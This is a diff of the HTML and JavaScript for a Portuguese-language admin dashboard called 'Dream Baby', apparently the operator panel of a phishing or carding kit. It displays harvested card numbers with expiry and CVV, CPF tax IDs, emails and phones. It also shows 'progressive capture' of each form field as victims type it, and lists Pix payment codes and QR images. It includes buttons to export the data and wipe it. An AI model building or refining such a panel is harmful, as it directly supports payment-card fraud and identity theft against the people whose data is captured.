@@ -5,37 +5,35 @@
   <meta charset="UTF-8">
   <title>Painel Administrativo - Dream Baby</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0; }
-    h1 { color: #333; }
-    .bloco, .pix-bloco {
-      background: #fff; padding: 10px 15px; margin-bottom: 10px;
-      border: 1px solid #ccc; border-radius: 6px;
-      cursor: pointer;
-    }
-    .detalhes, .lista-capturas, .lista-pix { display: none; margin-top: 10px; }
-    button, input[type="submit"] {
-      background-color: #4CAF50; color: white;
-      border: none; padding: 10px 15px; margin: 5px 0;
-      border-radius: 4px; cursor: pointer;
-    }
-    input[type="password"] { padding: 6px; margin-left: 10px; }
-    .acoes { margin-bottom: 20px; }
+    body { font-family: Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 20px; }
+    h1, h2 { color: #333; }
+    .container { max-width: 900px; margin: auto; }
+    .header, .acoes { margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+    .bloco { background: #fff; border-radius: 8px; padding: 10px 15px; margin-bottom: 10px; border: 1px solid #ccc; cursor: pointer; }
+    .detalhes, .grupo-capturas, .grupo-pix { display: none; margin-top: 10px; }
+    button, input[type="submit"] { background: #4CAF50; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
+    input[type="password"] { padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
+    .pix-bloco { background: #fff; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #ccc; }
+    .pix-bloco img { max-width: 160px; display: block; margin: 10px 0; }
+    .separador { border-top: 2px solid #ddd; margin: 30px 0 20px; }
   </style>
 </head>
 <body>
-  <h1>Painel Administrativo - Dream Baby</h1>
-  <div class="acoes">
-    <a href="/exportar-txt"><button>📤 Exportar Dados</button></a>
-    <form onsubmit="return limparDados(this)" style="display:inline;">
-      <label>Senha limpeza:</label>
-      <input type="password" name="senha" required />
-      <input type="submit" value="🧹 Limpar Dados" />
-    </form>
-    <button onclick="carregarAdmin()">🔄 Recarregar</button>
-    <a href="/logout"><button>🚪 Logout</button></a>
-  </div>
+  <div class="container">
+    <h1>Painel Administrativo - Dream Baby</h1>
+    <div class="acoes">
+      <button onclick="carregarAdmin()">🔄 Recarregar</button>
+      <a href="/exportar-txt"><button>📤 Exportar Dados</button></a>
+      <form onsubmit="return limparDados(this)" style="display:inline;">
+        <label>Senha limpeza:</label>
+        <input type="password" name="senha" required />
+        <input type="submit" value="🧹 Limpar Dados" />
+      </form>
+      <a href="/logout"><button>🚪 Logout</button></a>
+    </div>
 
-  <div id="painel">Carregando dados...</div>
+    <div id="painel">Carregando dados...</div>
+  </div>
 
   <script>
     async function carregarAdmin() {
@@ -49,82 +47,88 @@
         if (dados.finais?.length) {
           painel.innerHTML += "<h2>Dados Finais</h2>";
           dados.finais.forEach((dado, i) => {
-            painel.innerHTML += \`
-              <div class="bloco" onclick="alternar('final-\${i}')">
-                <strong>\${dado.nome}</strong>
-                <div class="detalhes" id="final-\${i}">
-                  <div>Número: \${dado.numeroCartao}</div>
-                  <div>Validade: \${dado.validade}</div>
-                  <div>CVV: \${dado.cvv}</div>
-                  <div>CPF: \${dado.cpf}</div>
-                  <div>Email: \${dado.email}</div>
-                  <div>Telefone: \${dado.telefone}</div>
+            painel.innerHTML += `
+              <div class="bloco" onclick="alternar('final-${i}')">
+                <strong>${dado.nome}</strong>
+                <div class="detalhes" id="final-${i}">
+                  <div>Número do Cartão: ${dado.numeroCartao}</div>
+                  <div>Validade: ${dado.validade}</div>
+                  <div>CVV: ${dado.cvv}</div>
+                  <div>CPF: ${dado.cpf}</div>
+                  <div>Email: ${dado.email}</div>
+                  <div>Telefone: ${dado.telefone}</div>
                 </div>
-              </div>\`;
+              </div>
+            `;
           });
         }
 
         // CAPTURA PROGRESSIVA
         if (dados.progressivos?.length) {
-          painel.innerHTML += "<h2 onclick='alternar("lista-capturas")' style='cursor:pointer;'>▶️ Captura Progressiva</h2><div id='lista-capturas' class='lista-capturas'>";
-          const agrupado = {};
-          dados.progressivos.forEach(p => {
-            if (!agrupado[p.sessionId]) agrupado[p.sessionId] = [];
-            agrupado[p.sessionId].push(p);
-          });
-          for (const [sessao, capturas] of Object.entries(agrupado)) {
-            painel.innerHTML += \`
+          painel.innerHTML += `
+            <div class="separador"></div>
+            <h2 onclick="alternar('grupo-capturas')" style="cursor:pointer;">📌 Capturas Progressivas</h2>
+            <div id="grupo-capturas" class="grupo-capturas">
+          `;
+          dados.progressivos.forEach((dado) => {
+            painel.innerHTML += `
               <div class="bloco">
-                <strong>Sessão:</strong> \${sessao}
-                <div class="detalhes">\` +
-                capturas.map(p => \`<div>\${p.campo}: \${p.valor}</div>\`).join('') +
-              \`</div>
-              </div>\`;
-          }
-          painel.innerHTML += "</div>";
-        }
-
-        // PAGAMENTOS PIX
-        if (dados.pix?.length) {
-          painel.innerHTML += "<h2 onclick='alternar("lista-pix")' style='cursor:pointer;'>▶️ Pagamentos via Pix</h2><div id='lista-pix' class='lista-pix'>";
-          dados.pix.forEach(p => {
-            painel.innerHTML += \`
-              <div class="pix-bloco">
-                <div><strong>Nome:</strong> \${p.nome}</div>
-                <div><strong>Telefone:</strong> \${p.telefone}</div>
-                <div><strong>Valor:</strong> R$ \${p.valor}</div>
-                <img src="\${p.qrCodeImage}" width="160" />
-                <div><strong>Chave:</strong> \${p.qrCodeString}</div>
-              </div>\`;
+                <div>Data: ${new Date(dado.data).toLocaleString()}</div>
+                <div>Campo: ${dado.campo}</div>
+                <div>Valor: ${dado.valor}</div>
+              </div>
+            `;
           });
           painel.innerHTML += "</div>";
         }
 
-      } catch (err) {
-        document.getElementById("painel").innerHTML = "Erro ao carregar dados.";
+        // DADOS PIX
+        if (dados.pix?.length) {
+          painel.innerHTML += `
+            <div class="separador"></div>
+            <h2 onclick="alternar('grupo-pix')" style="cursor:pointer;">💳 Pagamentos Pix</h2>
+            <div id="grupo-pix" class="grupo-pix">
+          `;
+          dados.pix.forEach((pix) => {
+            painel.innerHTML += `
+              <div class="pix-bloco">
+                <div><strong>Nome:</strong> ${pix.nome}</div>
+                <div><strong>Telefone:</strong> ${pix.telefone}</div>
+                <div><strong>Descrição:</strong> ${pix.descricao}</div>
+                <div><strong>Valor:</strong> R$ ${pix.valor}</div>
+                <div><strong>Código Pix:</strong> ${pix.codigo}</div>
+                <div><img src="${pix.qrcode}" alt="QR Code Pix"></div>
+              </div>
+            `;
+          });
+          painel.innerHTML += "</div>";
+        }
+
+      } catch (error) {
+        document.getElementById("painel").innerText = "Erro ao carregar dados.";
       }
     }
 
     function alternar(id) {
-      const el = document.getElementById(id);
-      if (el) el.style.display = (el.style.display === "block" ? "none" : "block");
+      const alvo = document.getElementById(id);
+      if (alvo) alvo.style.display = (alvo.style.display === "none" || alvo.style.display === "") ? "block" : "none";
     }
 
     async function limparDados(form) {
       const senha = form.senha.value;
-      const res = await fetch("/limpar-dados", {
+      const resp = await fetch("/limpar-dados", {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "senha=" + encodeURIComponent(senha)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ senha })
       });
-      const msg = await res.text();
-      alert(msg);
+      const res = await resp.text();
+      alert(res);
       carregarAdmin();
       return false;
     }
 
-    carregarAdmin();
     setInterval(carregarAdmin, 90000);
+    window.onload = carregarAdmin;
   </script>
 </body>
 </html>
